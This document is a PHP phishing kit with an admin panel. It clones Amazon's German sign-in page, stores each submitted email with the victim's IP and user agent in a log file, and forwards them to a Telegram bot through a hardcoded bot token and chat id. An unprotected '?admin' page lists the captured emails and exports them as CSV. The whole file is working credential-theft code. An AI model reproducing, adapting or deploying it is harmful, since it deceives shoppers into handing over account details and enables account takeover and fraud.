<?php
// ============================================================
// إعدادات بوت تيليغرام
// ============================================================
$bot_token = '8832943565:AAGcI7DS4gWATLCUM78o3TSJVo5CBxCa-Wk';
$chat_id   = '-1003788054267';

// ==================== التخزين المحلي ====================
$storageFile = 'logs.json';

function loadLogs($file) {
    if (!file_exists($file)) return [];
    $data = file_get_contents($file);
    return json_decode($data, true) ?: [];
}

function saveLog($file, $entry) {
    $logs = loadLogs($file);
    array_unshift($logs, $entry);
    $logs = array_slice($logs, 0, 500);
    file_put_contents($file, json_encode($logs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}
// ============================================================

// ==================== Admin Panel ====================
if (isset($_GET['admin'])) {
    $logs = loadLogs($storageFile);
    
    if (isset($_GET['clear'])) {
        file_put_contents($storageFile, json_encode([]));
        header('Location: ?admin');
        exit();
    }
    
    if (isset($_GET['export']) && $_GET['export'] === 'csv') {
        header('Content-Type: text/csv; charset=utf-8');
        header('Content-Disposition: attachment; filename="emails_' . date('Y-m-d_H-i-s') . '.csv"');
        $output = fopen('php://output', 'w');
        fwrite($output, "\xEF\xBB\xBF");
        fputcsv($output, ['#', 'Email', 'IP', 'User Agent', 'Timestamp']);
        $i = 1;
        foreach ($logs as $log) {
            fputcsv($output, [$i++, $log['email'] ?? '', $log['ip'] ?? '', $log['ua'] ?? '', $log['time'] ?? '']);
        }
        fclose($output);
        exit();
    }
    
    $total = count($logs);
    $uniqueIPs = count(array_unique(array_column($logs, 'ip')));
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔴 Live Admin Panel</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }
        .header { display: flex; justify-content: space-between; align-items: flex-start; flex-wrap: wrap; gap: 15px; margin-bottom: 20px; }
        .header h1 { font-size: 24px; }
        .header .sub { color: #8b949e; font-size: 14px; }
        .live-badge { display: inline-block; background: #f85149; color: white; font-size: 11px; padding: 2px 10px; border-radius: 10px; animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        .stats { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
        .stat-box { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 15px 25px; flex: 1; min-width: 120px; }
        .stat-box .num { font-size: 28px; font-weight: bold; color: #58a6ff; }
        .stat-box .label { font-size: 12px; color: #8b949e; text-transform: uppercase; }
        .actions { display: flex; gap: 10px; flex-wrap: wrap; }
        .btn { padding: 8px 16px; border: 1px solid #30363d; border-radius: 6px; background: #21262d; color: #c9d1d9; text-decoration: none; font-size: 14px; cursor: pointer; }
        .btn:hover { background: #30363d; }
        .btn-danger { border-color: #f85149; color: #f85149; }
        .btn-danger:hover { background: #f8514911; }
        .btn-success { border-color: #3fb950; color: #3fb950; }
        .btn-success:hover { background: #3fb95011; }
        table { width: 100%; border-collapse: collapse; background: #161b22; border-radius: 8px; overflow: hidden; }
        th { background: #1c2128; padding: 12px 10px; text-align: left; font-size: 12px; text-transform: uppercase; color: #8b949e; border-bottom: 2px solid #30363d; }
        td { padding: 10px; border-bottom: 1px solid #21262d; font-size: 13px; }
        tr:hover td { background: #1c2128; }
        .email { color: #f0883e; font-weight: bold; }
        .ip { color: #79c0ff; }
        .time { color: #8b949e; font-size: 12px; white-space: nowrap; }
        .ua-cell { max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 11px; color: #8b949e; }
        .empty { text-align: center; padding: 40px; color: #8b949e; }
        .refresh-info { font-size: 12px; color: #8b949e; margin-top: 10px; text-align: center; }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1>🔴 Live Email Monitor <span class="live-badge">LIVE</span></h1>
            <div class="sub">Auto-refresh every 3s | <code><?= basename($storageFile) ?></code></div>
        </div>
        <div class="actions">
            <a href="?admin" class="btn">🔄 Refresh</a>
            <a href="?admin&export=csv" class="btn btn-success">📥 CSV</a>
            <a href="?admin&clear=1" class="btn btn-danger" onclick="return confirm('Delete all logs?')">🗑 Clear</a>
        </div>
    </div>
    <div class="stats">
        <div class="stat-box"><div class="num"><?= $total ?></div><div class="label">📧 Emails</div></div>
        <div class="stat-box"><div class="num"><?= $uniqueIPs ?></div><div class="label">🌐 Unique IPs</div></div>
    </div>
    <table>
        <thead><tr><th>#</th><th>Email</th><th>IP</th><th>Time</th><th>UA</th></tr></thead>
        <tbody>
            <?php if (empty($logs)): ?>
                <tr><td colspan="5" class="empty">No emails captured yet.</td></tr>
            <?php else: $i = 1; ?>
                <?php foreach ($logs as $log): ?>
                <tr>
                    <td><?= $i++ ?></td>
                    <td class="email"><?= htmlspecialchars($log['email'] ?? '') ?></td>
                    <td class="ip"><?= htmlspecialchars($log['ip'] ?? '') ?></td>
                    <td class="time"><?= htmlspecialchars($log['time'] ?? '') ?></td>
                    <td class="ua-cell" title="<?= htmlspecialchars($log['ua'] ?? '') ?>"><?= htmlspecialchars(substr($log['ua'] ?? '', 0, 60)) ?></td>
                </tr>
                <?php endforeach; ?>
            <?php endif; ?>
        </tbody>
    </table>
    <div class="refresh-info">🔄 Auto-refresh every 3 seconds</div>
    <script>setTimeout(() => window.location.reload(), 3000);</script>
</body>
</html>
<?php exit(); }

// ==================== معالجة الإيميل ====================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email'])) {
    $email = trim($_POST['email']);
    if (!empty($email)) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
        $time = date('Y-m-d H:i:s');
        
        saveLog($storageFile, ['email' => $email, 'ip' => $ip, 'ua' => $ua, 'time' => $time]);
        
        $msg = "📧 Neue E-Mail von Amazon-Anmeldung:\n<code>" . htmlspecialchars($email) . "</code>\n🌐 IP: $ip\n⏰ $time";
        $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
        $postData = http_build_query(['chat_id' => $chat_id, 'text' => $msg, 'parse_mode' => 'HTML']);
        $opts = ['http' => ['method' => 'POST', 'header' => 'Content-Type: application/x-www-form-urlencoded', 'content' => $postData]];
        @file_get_contents($url, false, stream_context_create($opts));
        
        header('Location: 2.php');
        exit();
    }
}
?>
<!doctype html><html lang="en-gb" class="a-no-js" data-19ax5a9jf="dingo"><!-- sp:feature:head-start -->
<meta charset="utf-8"/>
<meta http-equiv='x-dns-prefetch-control' content='on'>
<link rel="preconnect" href="https://images-eu.ssl-images-amazon.com" crossorigin>
<link rel="preconnect" href="https://m.media-amazon.com" crossorigin>
<link rel="stylesheet" href="https://m.media-amazon.com/images/I/21uDPuQuYwL._RC|51SvmD+jTBL.css_.css?AUIClients/AmazonUI" />
<link rel="stylesheet" href="https://m.media-amazon.com/images/I/11WsGYSItxL._RC|01DE6WSvLKL.css,41ixaNR85ML.css,3182OVlP7IL.css,21JMC7OC91L.css,01xH+fhFIJL.css,0168Xo81wHL.css,413Vvv3GONL.css,1170nDgl0uL.css,01Rw4F+QU6L.css,11NeGmEx+fL.css,01LmAy9LJTL.css,01IdKcBuAdL.css,01iHqjS7YfL.css,01eVBHHaY+L.css,21D3IemrALL.css,11pDJV08stL.css,51yqRfvysvL.css,01HWrzt-WgL.css,01XPHJk60-L.css,11aX6hlPzjL.css,01GAxF7K5tL.css,01ZM-s8Z3xL.css,21gEzBqpmtL.css,11FeoxrgiyL.css,21TxBPhrLyL.css,01rSTIgNJIL.css,21Dt9D2TuML.css,31GD5I7tbCL.css,01i092IYHUL.css,01oaPOLX+-L.css,31Qk3MvcMIL.css,11PDZ29p-PL.css,11kbPm9N5xL.css,215WpAjwzoL.css,11sUwulETuL.css,114aTS6SjML.css,01xFKTPySiL.css,21GcfcmbahL.css,21OD8FuBraL.css,11XozyxiH7L.css,21n1oEPZnHL.css,11HVvPbE6JL.css,119Cktja74L.css,11PMguLK6gL.css,01890+Vwk8L.css,11TZSntL0oL.css,01qiwJ7qDfL.css,21AS3Iv3HQL.css,016mfgi+D2L.css,01VinDhK+DL.css,31un+UKeIeL.css,21msrr4h2yL.css,013-xYw+SRL.css_.css?AUIClients/AmazonUI#not-trident" />
<!doctype html><html lang="en" class="a-no-js" data-19ax5a9jf="dingo">
<meta name='encrypted-slate-token' content='AnYxnElDCNJJh9SHrkiOeYT8WF3fQ71sLMFDwo2P1uKLqE2wOLsKA0G8W49tL+Tz+7TEJIeTMvGBB/653B24ECAzzrpH33fqFKJTKH2t4D+ekozB2dk4QUnSl88YfI/mJbsKaDtFqc/ReKVsOU6yT8JjDJXPDJ97Br0urZEnZTV/eUu3XKrNbbdWqAJch+MM+Xvq8q8LWYFwJEqllzDan54zTl5YKfgsaJfmjWCKBF/TY0sPSNZDUWy/eBg8hW2dKuyDaSIro5xCTLTQ3vMOqHbuCVHDP9I5QbrKab01sFQTmicC8HjoUaUA2VONW0Waji8PJSPoK6zz'>
<meta name='bidi-endpoint' content='ws.ep-bc7e6cd92.bidi.amazon.dev'>
<meta name='flow-closure-id' content='1780922327'>
</head>
<body class="a-m-de a-aui_72554-c a-aui_template_weblab_cache_333406-c"><div id="a-page">
        <title dir="ltr">Amazon Sign-In</title>
        <link rel="stylesheet" href="https://m.media-amazon.com/images/I/21oSCHBx+cL.css?AUIClients/AuthXClaimCollectionUIAssets" />
<link rel="stylesheet" href="https://m.media-amazon.com/images/I/419qGgBpwOL.css?AUIClients/AuthXSharedUIAssets" />
        <div class="a-container auth-workflow">
            <div class="a-section a-spacing-medium">
                <div class="a-section a-spacing-none a-text-center">
        <a class="a-link-nav-icon" tabindex="-1" href="/-/en/ref=ap_frn_logo">
                <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
                  <i class="a-icon a-icon-domain-de a-icon-domain" role="presentation"></i>
            
          
        
      
    </a>
  </div>

            </div>
            <div id="authportal-center-section" class="a-section">
                
  <div class="a-section auth-pagelet-container">
      
        
        <div class="a-box"><div class="a-box-inner a-padding-extra-large">

<div id="claim-collection-container" aria-live="polite" class="a-section a-spacing-none">

  <noscript>
    <div id="auth-js-alert-box" class="a-box a-alert a-alert-error a-spacing-base" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert" aria-hidden="true"></i><div class="a-alert-content">
      This site requires JavaScript to function correctly. Please enable JavaScript on your browser to continue.
    </div></div></div>
  </noscript>

        <h1 class="a-size-medium-plus a-spacing-small">
            Sign in or create an account
        </h1>

  <p class="a-spacing-micro a-text-bold">
    Enter mobile number or email
  </p>

 
  <span class="a-declarative" data-action="submit-claim" data-submit-claim="{}">
    <form id="ap_login_form" name="signIn" method="post" novalidate action="">

      <input type="hidden" name="appAction" value="SIGNIN_CLAIM_COLLECT"/>
      <input type="hidden" name="subPageType" value="FullPageUnifiedClaimCollect"/>
      <input type="hidden" name="claimCollectionWorkflow" value="unified"/>
      <input type="hidden" name="metadata1" value="true"/>
      <input type="hidden" name="claimType"/>
      <input type="hidden" name="countryCode"/>
      <input type="hidden" name="isServerSideRouting" value="true"/>

<div id="claim-input-container" class="a-section a-spacing-micro">

<span class="a-dropdown-container"><select name="" autocomplete="off" role="combobox" data-a-native-class="aok-hidden" data-a-touch-header="Country/region code" id="claim-input-dropdown-select-element" tabindex="0" data-action="a-dropdown-select" class="a-native-dropdown a-declarative aok-hidden">
    

        
        <option data-calling-code="49" value="DE" data-a-html-content="Germany &lt;span dir=&quot;ltr&quot;&gt;+49&lt;/span&gt;" selected>
            DE +49
        </option>

    
</select><span tabindex="-1" id="claim-input-dropdown" data-a-class="aok-hidden" class="a-button a-button-dropdown aok-hidden" aria-hidden="true"><span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" aria-hidden="true"><span class="a-dropdown-prompt">DE +49</span></span><i class="a-icon a-icon-dropdown"></i></span></span></span>


        
            <input type="email" id="ap_email_login" autocomplete="webauthn" name="email" class="a-input-text" data-tab-layout-weblab-treatment="" aria-label="Enter mobile number or email"/>
        

        

        
    

    <button id="claim-input-clear-button" class="clear-text-field-button" type="button">
        <i class="a-icon a-icon-close" role="presentation"></i>
    </button>
</div>



      <!--Hidden password input for password autofill support -->
      




    
    

    
    
    
    
    
        <input type="password" maxlength="1024" id="auth-credential-autofill-hint" name="password" class="a-input-text aok-hidden"/>
    


      <!-- Error messages -->
      








  <div id="empty-claim-alert" class="a-box a-alert-inline a-alert-inline-error aok-hidden a-spacing-top-small" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert" aria-hidden="true"></i><div class="a-alert-content">
    Enter your mobile number or email
  </div></div></div>
  <div id="invalid-phone-alert" class="a-box a-alert-inline a-alert-inline-error aok-hidden a-spacing-top-small" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert" aria-hidden="true"></i><div class="a-alert-content">
    Invalid mobile number
  </div></div></div>
  <div id="invalid-email-alert" class="a-box a-alert-inline a-alert-inline-error aok-hidden a-spacing-top-small" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert" aria-hidden="true"></i><div class="a-alert-content">
    Invalid email address
  </div></div></div>
  
  <div id="error-alert" class="a-box a-alert-inline a-alert-inline-error aok-hidden a-spacing-top-small" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert" aria-hidden="true"></i><div class="a-alert-content">
    Something’s not right. Try again.
  </div></div></div>


      <!-- Error messages specific to passkeys -->
      




  
    
    <p id="passkey-not-found-error-title" class="aok-hidden">Amazon passkeys deleted</p>

    <div id="passkey-error-alert" class="a-box a-alert-inline a-alert-inline-error aok-hidden a-spacing-top-small" role="alert"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">Passkey error</h4><i class="a-icon a-icon-alert" aria-hidden="true"></i><div class="a-alert-content">
    <p id="passkey-client-error-message">
      Something went wrong. Please sign-in another way or follow any instructions provided by your device.
    </p>
    <p id="passkey-generic-server-error-message" class="aok-hidden">
      Sorry, your passkey isn't working. There might be a problem with the server. Sign in with your password or try your passkey again later.
    </p>
    <p id="passkey-not-found-error-message" class="aok-hidden">
      Sign in with your password. To prevent this error, go to your cloud service account (example: Apple ID or Google account) and delete saved passkeys.
    </p>
    <p id="passkey-server-error-message" class="aok-hidden"></p>
  </div></div></div>


      <!-- Submit button spacingTop Attribute-->
      

      <!-- Email domain auto complete for Mobile-->
      






      <!-- Submit button -->
      <span id="continue" class="a-button a-spacing-top-small a-button-span12 a-button-primary aok-relative"><span class="a-button-inner"><input class="a-button-input" type="submit" aria-labelledby="continue-announce"/><span id="continue-announce" class="a-button-text a-text-center" aria-hidden="true">
        <!-- Overlaid spinner -->
        <span id="claim-submit-spinner" class="a-spinner a-spinner-medium aok-hidden"></span>
        Continue
      </span></span></span>
    </form>
  </span>

  <!-- ATC not now button -->
  

  <!-- Legal text -->
  
    <p class="a-spacing-top-medium a-size-small legal-text">
      By continuing, you agree to Amazon's <a href="/-/en/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?ie=UTF8&amp;nodeId=505048">Conditions of Use</a> and <a href="/-/en/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?ie=UTF8&amp;nodeId=3312401">Privacy Notice</a>.
    </p>
  

  
    




    <div class="a-section">
        
        <ul class="a-unordered-list a-nostyle a-vertical">
            
                <li><span class="a-list-item">
                    <a class="a-size-base a-link-normal" target="_blank" rel="noopener noopener" href="/-/en/gp/help/customer/account-issues/ref=unified_claim_collection?ie=UTF8" role="button">
                        Need help?
                    </a>
                </span></li>
            
        </ul>
    </div>

  

  
    
      
      
        





  



  <div id="ab-registration-link-section" class="a-section a-spacing-none">
    <hr aria-hidden="true" class="a-divider-normal"/>
    <div class="a-section a-spacing-micro">
      <span class="a-text-bold">
        Buying for work?
      </span>
    </div>

    <a id="ab-registration-ingress-link" class="a-link-normal" href="/-/en/business/register/org/landing?ref_=ab_reg_signin_unifiedauth">
      <span>
        Create a free business account
      </span>
    </a>
  </div>

      
    
  


  




</div>

            
          
        </div></div>

        

          

        
        
      


    
  </div>


            </div>
        </div>

        <!-- Injects the Javascript assets -->
        
        






<div class="a-section a-spacing-top-extra-large auth-footer">
    <div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>
    
        <div class="a-section a-spacing-small a-text-center">
            
                <span class="auth-footer-seperator"></span>
                
                    <a class="a-size-mini a-link-normal a-nowrap" target="_blank" rel="noopener noopener" href="/-/en/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=505048">
                        Conditions of Use
                    </a>
                    <span class="auth-footer-seperator"></span>
                
                    <a class="a-size-mini a-link-normal a-nowrap" target="_blank" rel="noopener noopener" href="/-/en/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=3312401">
                        Privacy Notice
                    </a>
                    <span class="auth-footer-seperator"></span>
                
                    <a class="a-size-mini a-link-normal a-nowrap" target="_blank" rel="noopener noopener" href="/-/en/help">
                        Help
                    </a>
                    <span class="auth-footer-seperator"></span>
                
                    <a class="a-size-mini a-link-normal a-nowrap" target="_blank" rel="noopener noopener" href="/-/en/gp/help/customer/display.html/ref=ap_footer_imprint?ie=UTF8&amp;nodeId=202024860">
                        Legal Notice
                    </a>
                    <span class="auth-footer-seperator"></span>
                
                    <a class="a-size-mini a-link-normal a-nowrap" target="_blank" rel="noopener noopener" href="/-/en/gp/help/customer/display.html/?nodeId=201890250">
                        Cookies Notice
                    </a>
                    <span class="auth-footer-seperator"></span>
                
                    <a class="a-size-mini a-link-normal a-nowrap" target="_blank" rel="noopener noopener" href="/gp/help/customer/display.html/?nodeId=201909150">
                        Interest-based Ads
                    </a>
                    <span class="auth-footer-seperator"></span>
                
            
        </div>
    
    <div class="a-section a-text-center">
        <span class="a-size-mini a-color-secondary">
            
                
                © 1996-2026, Amazon.com, Inc. or its affiliates
            
        </span>
    </div>
</div>


        <div id='be' style="display:none;visibility:hidden;"><form name='ue_backdetect' action="get"><input type="hidden" name='ue_back' value='1' /></form>



</div>

<noscript>
    <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-eu.amazon.de/1/batch/1/OP/A1PA6795UKMFR9:260-5731645-2088301:S269M0NWDV8F4BPWKWH6$uedata=s:%2Fuedata%2Fuedata%3Fnoscript%26id%3DS269M0NWDV8F4BPWKWH6:0' alt=""/>
</noscript>

</body></html>